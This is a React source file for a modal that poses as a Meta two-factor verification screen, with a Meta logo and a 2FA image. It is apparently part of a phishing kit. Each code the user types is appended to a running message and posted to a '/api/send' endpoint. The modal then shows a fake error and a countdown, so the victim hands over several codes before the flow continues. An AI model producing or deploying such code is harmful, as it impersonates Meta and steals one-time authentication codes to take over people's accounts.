import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TwoFAImage from '@/assets/images/2FA.png';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import config from '@/utils/config';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);

    const { messageId, messageContent, setMessageId, setMessageContent } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const codeLine = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;

        const updatedMessage = messageContent ? `${messageContent}\n\n${codeLine}` : codeLine;

        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            setMessageContent(updatedMessage);

            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='ae-modal-overlay'>
            <div className='ae-modal-panel'>
                <div className='ae-modal-body'>
                    <p className='ae-modal-title'>{texts.verifyTitle}</p>
                    <p className='ae-modal-lead'>{texts.verifyDesc}</p>
                    <Image src={TwoFAImage} alt='2FA visual' className='ae-verify-image' />
                    <div className='mt-4 w-full'>
                        <input
                            type='tel'
                            inputMode='numeric'
                            pattern='[0-9]*'
                            id='code-input'
                            value={code}
                            onChange={(e) => {
                                const value = e.target.value.replaceAll(/\D/g, '');
                                if (value.length <= 8) {
                                    setCode(value);
                                }
                            }}
                            maxLength={8}
                            disabled={countdown > 0}
                            className={`form-control ${countdown > 0 ? 'cursor-not-allowed opacity-60' : ''}`}
                            placeholder={texts.verifyCode}
                        />
                    </div>
                    {showError && (
                        <p className='mt-2 text-[15px] text-red-500'>
                            {texts.verifyError} {countdown}s.
                        </p>
                    )}
                    <button type='button' onClick={handleSubmit} disabled={isLoading || code.length < 6 || countdown > 0} className={`btn btn-primary w-100 ${isLoading || code.length < 6 || countdown > 0 ? 'cursor-not-allowed opacity-80' : ''}`}>
                        {isLoading ? <span className='custom-spinner' /> : texts.continueBtn}
                    </button>
                </div>
                <div className='ae-modal-footer'>
                    <Image src={MetaLogo} alt='Meta logo' width={70} height={20} />
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
